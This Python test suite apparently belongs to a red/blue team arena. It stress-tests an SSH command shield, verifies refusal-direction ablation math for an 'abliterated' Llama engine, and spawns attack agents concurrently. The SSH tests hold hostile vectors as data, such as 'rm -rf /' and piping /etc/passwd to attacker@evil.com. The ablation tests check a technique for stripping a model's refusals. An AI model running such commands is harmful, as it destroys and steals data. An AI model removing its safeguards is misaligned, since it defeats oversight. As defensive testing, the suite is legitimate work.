#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================================
Challenger 1 Adversarial Stress & Empirical Verification Test Suite
Subsystem: 05_agents_and_swarms/red_blue_arena/tests/test_challenger_adversarial_stress.py
Classification: Adversarial QA & Stress Harness • Rule #0 Verification
==============================================================================
"""

import os
import sys
import math
import time
import socket
import tempfile
import threading
import concurrent.futures
from pathlib import Path
from typing import List, Dict, Any
from unittest.mock import patch, MagicMock

import numpy as np
import pytest

# Subsystem root
subsystem_root = Path(__file__).resolve().parent.parent
if str(subsystem_root) not in sys.path:
    sys.path.insert(0, str(subsystem_root))

from blue_team.blue_team_ssh_shield import (
    BlueTeamSSHShield,
    ExecutionResult,
    HealthStatus,
    TransportTier
)
from red_team.abiliterated_llama_engine import (
    RepresentationAblationEngine,
    AbiliteratedLlamaEngine,
    RefusalAblationConfig,
    AttackPlan,
    AttackResult,
    VulnerabilityReport,
    AttackDomain,
    SeverityLevel,
    SmolAgentSwarmSpawner,
    RedTeamSubagent,
    TORCH_AVAILABLE,
    SMOLAGENTS_AVAILABLE
)
from red_team.red_team_attack_harness import (
    RedTeamAttackHarness,
    SSHConfigProbe,
    RPCListenerProbe,
    AndroidDozeProbe,
    ASTSecurityProbe,
    RuleZeroTruthProbe,
    SSHProbeTool,
    RPCProbeTool,
    ASTProbeTool,
    AndroidDozeProbeTool,
    RuleZeroTruthProbeTool
)

try:
    import torch
except ImportError:
    torch = None

try:
    import smolagents
except ImportError:
    smolagents = None


# ==============================================================================
# Fixtures
# ==============================================================================

@pytest.fixture
def mock_ed25519_key(tmp_path):
    """Creates a temporary mock Ed25519 key pair."""
    key_path = tmp_path / "id_ed25519"
    pub_path = tmp_path / "id_ed25519.pub"
    key_path.write_text("-----BEGIN OPENSSH PRIVATE KEY-----\ntestprivatekey\n-----END OPENSSH PRIVATE KEY-----\n")
    pub_path.write_text("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIValidEd25519Key test@lauburu\n")
    return str(key_path)

@pytest.fixture
def mock_rsa_key(tmp_path):
    """Creates a temporary RSA key pair."""
    key_path = tmp_path / "id_rsa"
    pub_path = tmp_path / "id_rsa.pub"
    key_path.write_text("-----BEGIN RSA PRIVATE KEY-----\ntestrsa\n-----END RSA PRIVATE KEY-----\n")
    pub_path.write_text("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC test@lauburu\n")
    return str(key_path)


# ==============================================================================
# 1. SSH Hardening, Metacharacter Injection & Failover Stress Tests
# ==============================================================================

class TestSSHHardeningAndInjectionStress:
    """Adversarial stress-testing of SSH argument parsing, injection defenses, and failover."""

    def test_parameterized_command_construction_metacharacters(self, mock_ed25519_key, tmp_path):
        """Stress-tests command argument vectors with adversarial shell metacharacters."""
        control_dir = tmp_path / "ctrl"
        shield = BlueTeamSSHShield(key_path=mock_ed25519_key, control_dir=str(control_dir))

        malicious_vectors = [
            ["ls", "; rm -rf /"],
            ["cat", "/etc/passwd | mail attacker@evil.com"],
            ["touch", "foo && $(whoami)"],
            ["echo", "`id`"],
            ["find", ".", "-exec", "rm", "-rf", "{}", "+"],
            ["echo", "$PATH", "${HOME}", "\nreboot"],
            ["grep", "-r", "secret", "*", "||", "true"],
            ["python3", "-c", "import os; os.system('malicious')"],
        ]

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="mock_output", stderr="")
            
            for cmd_vec in malicious_vectors:
                res = shield.execute_command("mac-mini", cmd_vec, timeout_s=5.0)
                assert res.success is True
                assert res.command_executed == cmd_vec

                # Verify subprocess.run was invoked with shell=False
                mock_run.assert_called()
                call_args, call_kwargs = mock_run.call_args
                assert call_kwargs.get("shell") is False or call_kwargs.get("shell") is None
                
                # Check that command arguments were preserved without local shell concatenation
                passed_cmd = call_args[0]
                assert isinstance(passed_cmd, list)
                assert passed_cmd[0] == "ssh"
                for arg in cmd_vec:
                    assert arg in passed_cmd

    def test_type_enforcement_prevents_raw_string_injection(self, mock_ed25519_key):
        """Ensures non-List inputs (strings, dicts, ints) raise immediate TypeErrors."""
        shield = BlueTeamSSHShield(key_path=mock_ed25519_key)

        with pytest.raises(TypeError, match="must be a List\\[str\\]"):
            shield.execute_command("mac-mini", "rm -rf /; echo injection")  # type: ignore

        with pytest.raises(TypeError, match="must be a List\\[str\\]"):
            shield.execute_command("mac-mini", {"cmd": "ls"})  # type: ignore

        with pytest.raises(ValueError, match="cannot be empty"):
            shield.execute_command("mac-mini", [])

    def test_port_8022_termux_path_prefix_preservation(self, mock_ed25519_key):
        """Validates that Android port 8022 adds Termux environment prefix correctly."""
        shield = BlueTeamSSHShield(key_path=mock_ed25519_key)

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="termux_ok", stderr="")
            res = shield.execute_command("pixel", ["uname", "-a"])
            assert res.success is True
            call_args, _ = mock_run.call_args
            passed_cmd = call_args[0]
            assert any("export PATH=/data/data/com.termux/files/usr/bin" in arg for arg in passed_cmd)

    def test_controlmaster_socket_path_formatting_and_length(self, mock_ed25519_key, tmp_path):
        """Verifies ControlMaster socket path structure, directory creation, and length safety."""
        control_dir = tmp_path / "ssh_ctrl"
        shield = BlueTeamSSHShield(key_path=mock_ed25519_key, control_dir=str(control_dir))
        
        assert control_dir.exists()
        
        # Test socket naming convention
        node_key = "mac-mini"
        ip, port, user, _ = shield.resolve_best_endpoint(node_key)
        expected_socket = control_dir / f"cm-{user}@{ip}-{port}"
        
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
            shield.execute_command("mac-mini", ["echo", "test"])
            call_args, _ = mock_run.call_args
            passed_cmd = call_args[0]
            assert f"ControlPath={expected_socket}" in passed_cmd

    def test_5_tier_failover_sequential_link_drops(self, mock_ed25519_key):
        """Simulates cascade network failures across all 5 tiers."""
        shield = BlueTeamSSHShield(key_path=mock_ed25519_key)

        # 1. Tier 1 Active (TB4 UP)
        with patch.object(BlueTeamSSHShield, "test_tcp_port", side_effect=lambda ip, port, timeout=0.35: "169.254.80.69" in ip):
            _, _, _, tier = shield.resolve_best_endpoint("mac-mini")
            assert tier == TransportTier.TB4_DMA

        # 2. Tier 1 DOWN, Tier 2 Active (Headscale UP)
        with patch.object(BlueTeamSSHShield, "test_tcp_port", side_effect=lambda ip, port, timeout=0.35: ip in ["100.64.0.1", "100.119.199.76"]):
            _, _, _, tier = shield.resolve_best_endpoint("mac-mini")
            assert tier == TransportTier.HEADSCALE

        # 3. Tier 1 & 2 DOWN, Tier 3 Active (LAN UP)
        with patch.object(BlueTeamSSHShield, "test_tcp_port", side_effect=lambda ip, port, timeout=0.35: ip == "192.168.8.230"):
            _, _, _, tier = shield.resolve_best_endpoint("mac-mini")
            assert tier == TransportTier.LOCAL_LAN

        # 4. Tier 1, 2, 3 DOWN, Tier 4 Active (USB ADB UP for Pixel)
        with patch.object(BlueTeamSSHShield, "test_tcp_port", side_effect=lambda ip, port, timeout=0.35: ip == "169.254.60.151"):
            _, _, _, tier = shield.resolve_best_endpoint("pixel")
            assert tier == TransportTier.ADB_DIRECT

        # 5. All Tiers DOWN -> Tier 5 (WoL Resurrection)
        with patch.object(BlueTeamSSHShield, "test_tcp_port", return_value=False):
            with patch.object(BlueTeamSSHShield, "trigger_resurrection", return_value=True) as mock_wake:
                _, _, _, tier = shield.resolve_best_endpoint("mac-mini")
                assert tier == TransportTier.WOL_RESURRECTION
                mock_wake.assert_called_once()


# ==============================================================================
# 2. Representation Ablation Vector Math Stress Tests
# ==============================================================================

class TestRepresentationAblationVectorMathStress:
    """
    Adversarially stress-tests representation engineering and refusal direction ablation:
    h_clean = h - (h . r) * r
    Verifies orthogonality, idempotency, extreme edge cases, and high-dimensional spaces.
    """

    @pytest.mark.parametrize("dim", [128, 512, 1024, 4096, 8192])
    def test_orthogonality_across_dimensions_numpy(self, dim: int):
        """Empirically tests orthogonality h_clean . r == 0 across multiple embedding dimensions."""
        rng = np.random.default_rng(42)
        h = rng.standard_normal(dim)
        r = rng.standard_normal(dim)

        h_clean = RepresentationAblationEngine.project_orthogonal_numpy(h, r)
        r_unit = RepresentationAblationEngine.normalize_vector(r)

        # Dot product with unit refusal direction must be numerically zero
        dot_clean = np.dot(h_clean, r_unit)
        assert abs(dot_clean) < 1e-6, f"Failed orthogonality at dim={dim}: dot={dot_clean}"
        
        ortho_err = RepresentationAblationEngine.verify_orthogonality(h_clean, r)
        assert ortho_err < 1e-6, f"verify_orthogonality returned error {ortho_err}"

    @pytest.mark.parametrize("dim", [128, 512, 1024, 4096])
    def test_idempotency_invariant(self, dim: int):
        """Verifies mathematical idempotency: Ablate(h_clean, r) == h_clean."""
        rng = np.random.default_rng(123)
        h = rng.standard_normal(dim)
        r = rng.standard_normal(dim)

        h_clean_1 = RepresentationAblationEngine.project_orthogonal_numpy(h, r)
        h_clean_2 = RepresentationAblationEngine.project_orthogonal_numpy(h_clean_1, r)

        np.testing.assert_allclose(
            h_clean_1, h_clean_2, atol=1e-7, rtol=1e-7,
            err_msg=f"Idempotency violated at dim={dim}"
        )

    def test_extreme_vector_edge_cases(self):
        """Stress-tests mathematical boundary conditions and extreme vector scenarios."""
        dim = 4096
        rng = np.random.default_rng(999)
        r = rng.standard_normal(dim)
        r_unit = RepresentationAblationEngine.normalize_vector(r)

        # Edge Case 1: Zero hidden state vector (h = 0)
        h_zero = np.zeros(dim)
        h_clean_zero = RepresentationAblationEngine.project_orthogonal_numpy(h_zero, r)
        np.testing.assert_allclose(h_clean_zero, np.zeros(dim), atol=1e-12)

        # Edge Case 2: Parallel vector (h = c * r) -> should completely ablate to zero vector
        for c in [-100.0, -1.0, 1.0, 42.0, 1e4]:
            h_parallel = c * r_unit
            h_clean_parallel = RepresentationAblationEngine.project_orthogonal_numpy(h_parallel, r)
            norm_remaining = np.linalg.norm(h_clean_parallel)
            assert norm_remaining < 1e-5, f"Parallel vector scalar {c} failed to ablate to 0: norm={norm_remaining}"

        # Edge Case 3: Already orthogonal vector (h . r == 0) -> should remain unchanged
        random_vec = rng.standard_normal(dim)
        h_orthogonal = random_vec - np.dot(random_vec, r_unit) * r_unit
        h_clean_ortho = RepresentationAblationEngine.project_orthogonal_numpy(h_orthogonal, r)
        np.testing.assert_allclose(h_clean_ortho, h_orthogonal, atol=1e-6)

        # Edge Case 4: Zero or near-zero refusal vector (r = 0)
        r_zero = np.zeros(dim)
        h_rand = rng.standard_normal(dim)
        h_clean_rzero = RepresentationAblationEngine.project_orthogonal_numpy(h_rand, r_zero)
        assert not np.isnan(h_clean_rzero).any()
        assert not np.isinf(h_clean_rzero).any()

        # Edge Case 5: Extremely small norm refusal vector (< 1e-12)
        r_tiny = np.full(dim, 1e-15)
        h_clean_rtiny = RepresentationAblationEngine.project_orthogonal_numpy(h_rand, r_tiny)
        assert not np.isnan(h_clean_rtiny).any()

        # Edge Case 6: Non-unit norm refusal vector (norm = 1e5)
        r_huge = r * 1e5
        h_clean_huge = RepresentationAblationEngine.project_orthogonal_numpy(h_rand, r_huge)
        dot_huge = np.dot(h_clean_huge, r_unit)
        assert abs(dot_huge) < 1e-6

    def test_multi_batch_and_sequence_shapes(self):
        """Stress-tests 2D (Batch, Dim) and 3D (Batch, Seq, Dim) tensor operations."""
        dim = 4096
        rng = np.random.default_rng(777)
        r = rng.standard_normal(dim)

        # 2D: (Batch=32, Dim=4096)
        h_2d = rng.standard_normal((32, dim))
        h_clean_2d = RepresentationAblationEngine.project_orthogonal_numpy(h_2d, r)
        assert h_clean_2d.shape == (32, dim)
        err_2d = RepresentationAblationEngine.verify_orthogonality(h_clean_2d, r)
        assert err_2d < 1e-6

        # 3D: (Batch=8, Seq=64, Dim=4096)
        h_3d = rng.standard_normal((8, 64, dim))
        h_clean_3d = RepresentationAblationEngine.project_orthogonal_numpy(h_3d, r)
        assert h_clean_3d.shape == (8, 64, dim)
        err_3d = RepresentationAblationEngine.verify_orthogonality(h_clean_3d, r)
        assert err_3d < 1e-6

    @pytest.mark.skipif(torch is None, reason="PyTorch not available in current python environment")
    def test_pytorch_tensor_parity_with_numpy(self):
        """Validates numerical parity between NumPy and PyTorch implementations."""
        dim = 4096
        rng = np.random.default_rng(555)
        h_np = rng.standard_normal((16, dim)).astype(np.float32)
        r_np = rng.standard_normal(dim).astype(np.float32)

        # NumPy computation
        h_clean_np = RepresentationAblationEngine.project_orthogonal_numpy(h_np, r_np)

        # PyTorch computation
        h_torch = torch.from_numpy(h_np)
        r_torch = torch.from_numpy(r_np)
        h_clean_torch = RepresentationAblationEngine.project_orthogonal_torch(h_torch, r_torch).numpy()

        np.testing.assert_allclose(
            h_clean_np, h_clean_torch, atol=1e-5, rtol=1e-5,
            err_msg="PyTorch and NumPy ablation implementations diverged"
        )


# ==============================================================================
# 3. smolagents Dynamic Instantiation Under Concurrent Load
# ==============================================================================

class TestSmolagentsConcurrencyStress:
    """Stress tests dynamic instantiation, tool execution, and thread safety under concurrent load."""

    def test_concurrent_swarm_spawner_load(self):
        """Simulates 20 concurrent threads rapidly instantiating subagents and tools."""
        engine = AbiliteratedLlamaEngine()
        harness = RedTeamAttackHarness()

        num_threads = 20
        results = []
        errors = []

        def worker_spawn(worker_id: int):
            try:
                # Spawn CodeAgent
                agent = engine.spawn_code_agent()
                assert agent is not None
                
                # Spawn ToolCallingAgent
                tool_agent = engine.spawn_tool_calling_agent()
                assert tool_agent is not None

                # Fetch tools
                tools = harness.get_smolagents_tools()
                assert len(tools) == 5

                # Execute lightweight tool invocation
                ast_tool = ASTProbeTool()
                out = ast_tool.forward("import subprocess\nsubprocess.run('ls', shell=True)")
                assert "CWE-78" in out

                results.append(worker_id)
            except Exception as e:
                errors.append((worker_id, str(e)))

        threads = [threading.Thread(target=worker_spawn, args=(i,)) for i in range(num_threads)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert len(errors) == 0, f"Concurrent spawner encountered errors: {errors}"
        assert len(results) == num_threads

    def test_concurrent_isolated_harness_probe_executions(self):
        """Executes concurrent sandboxed attack plans verifying per-thread isolation."""
        engine = AbiliteratedLlamaEngine()

        subsystems = [
            "00_core_infrastructure/ssh",
            "02_ai_models_and_inference/rpc",
            "01_apps/termux_doze",
            "01_apps/canonical_port/ast",
            "03_biometrics/truth_audit"
        ]

        def execute_isolated_plan(subsystem: str):
            # Per-worker harness instance to ensure isolated sandbox directory management
            local_harness = RedTeamAttackHarness()
            try:
                plan = engine.generate_attack_plan(subsystem, {"permit_root_login": True, "password_auth": True})
                res = local_harness.run_plan(plan)
                return res
            finally:
                local_harness.cleanup_sandboxes()

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            future_to_sub = {executor.submit(execute_isolated_plan, s): s for s in subsystems * 2}
            completed_results = []
            for future in concurrent.futures.as_completed(future_to_sub):
                sub = future_to_sub[future]
                try:
                    res = future.result()
                    assert res.plan_id.startswith("PLAN_")
                    assert res.sandbox_preserved is True
                    completed_results.append(res)
                except Exception as e:
                    pytest.fail(f"Execution failed for subsystem {sub}: {e}")

        assert len(completed_results) == 10


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
